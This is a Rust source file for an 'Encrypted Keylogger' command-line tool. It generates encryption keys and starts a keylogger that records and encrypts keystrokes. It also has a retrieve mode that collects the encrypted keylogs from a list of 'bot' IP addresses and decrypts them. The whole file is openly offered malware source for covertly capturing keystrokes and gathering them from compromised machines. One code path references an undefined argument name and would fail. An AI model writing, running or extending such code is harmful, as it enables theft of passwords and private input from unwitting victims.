#[macro_use]
extern crate clap;

extern crate keylogger_lib;

use keylogger_lib::*;

fn main() {
    let args = clap::App::new("Encrypted Keylogger")
        .version(crate_version!())
        .author("Hand of C'thulhu")
        .arg(clap::Arg::with_name("generate")
            .long("generate")
            .requires("secret_key")
            .conflicts_with_all(&["decrypt", "retrieve"])
            .takes_value(false))
        .arg(clap::Arg::with_name("decrypt")
            .short("D")
            .long("decrypt")
            .value_name("FILE")
            .help("Specify the decrypt file, and turn into decrypt mode")
            .takes_value(true)
            .requires("secret_key")
            .min_values(0))
        .arg(clap::Arg::with_name("secret_key")
            .short("s")
            .long("sec-key")
            .takes_value(true)
            .help("Secret asymmetric encryption key")
            .value_name("SEC_KEY_FILE"))
        .arg(clap::Arg::with_name("retrieve")
            .short("R")
            .long("retrieve")
            .help("Retrieves data from remote location, pair with --decrypt to automatically print decrypted data")
            .takes_value(true)
            .value_name("DEST_FOLDER"))
        .arg(clap::Arg::with_name("bot_addr")
            .long("bot-addr")
            .help("Ips and ports to retrieve encrypted logs from")
            .requires("retrieve")
            .takes_value(true)
            .value_name("FILE")
            .default_value("bot_addr.list"))
        .arg(clap::Arg::with_name("SYM_KEY")
            .help("Symmetric encryption key")
            .required(true))
        .arg(clap::Arg::with_name("PUB_KEY")
            .help("Public asymmetric encryption key")
            .required(true))
        .get_matches();

    if args.is_present("generate") {
        if let Err(err) = gen_key_pair(args.value_of("PUB_KEY").unwrap(), args.value_of("secret_key").unwrap()) {
            println!("{}", err.description());
        } else {
            println!("Public and private key generated");
        }
        generate_key_and_nonce(args.value_of("SYM_KEY").unwrap()).expect("Key generation failed");
        return;
    }

    if let Some(retrieve_path) = args.value_of("retrieve") {
        let retrieve_path = std::path::Path::new(retrieve_path);
        let bot_addr_list = parse_bot_list(args.value_of("bot_addr").unwrap_or("bot_addr.list")).unwrap_or_else(|err| {
            println!("Error with bot-address-list path: {}", err);
            std::process::exit(1);
        });
        use std::io::Read;
        let mut public_key = Vec::new();
        std::fs::File::open(args.values_of("asymmetric_keys").unwrap().collect::<Vec<&str>>()[0]).expect("Wrong public file").read_to_end(&mut public_key).unwrap();
        //TODO: make retrieval streamified
        let encrypted_data_paths: Vec<Vec<std::path::PathBuf>> = bot_addr_list.iter().map(|bot_addr| {
            retrieve_remote_keylogs(bot_addr, &public_key).iter().map(|&(ref name, ref data)| {
                use std::io::Write;
                let output_path = retrieve_path.join(format!("{}_{}", bot_addr.split(":").collect::<Vec<&str>>()[0], name));

                std::fs::OpenOptions::new()
                    .write(true)
                    .create(true)
                    .append(true)
                    .open(&output_path)
                    .expect("Open problems")
                    .write(data.as_ref())
                    .expect("Write problems");
                output_path
            }).collect::<Vec<std::path::PathBuf>>()
        }).collect();
        let encrypted_data_paths: Vec<&std::path::PathBuf> = encrypted_data_paths.iter().flat_map(|p| p).collect();
        println!("{:?}", encrypted_data_paths);

        if !args.is_present("decrypt") { return; }

        for path in encrypted_data_paths {
            decrypt_asym_sym(
                path.to_str().unwrap(),
                args.value_of("PUB_KEY").unwrap(),
                args.value_of("secret_key").unwrap(),
                args.value_of("SYM_KEY").unwrap())
                .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
        }
        return;
    }

    if let Some(decrypt_path) = args.value_of("decrypt") {
        decrypt_asym_sym(
            decrypt_path,
            args.value_of("PUB_KEY").unwrap(),
            args.value_of("secret_key").unwrap(),
            args.value_of("SYM_KEY").unwrap())
            .unwrap_or_else(|err| println!("Error with decrypting: {}", err));
    } else {
        key_log(&keylogger_lib::EncryptionDetails {
            pub_key_loc: args.value_of("PUB_KEY").unwrap().to_owned(),
            sym_key_loc: args.value_of("SYM_KEY").unwrap().to_owned(),
        });
    }
}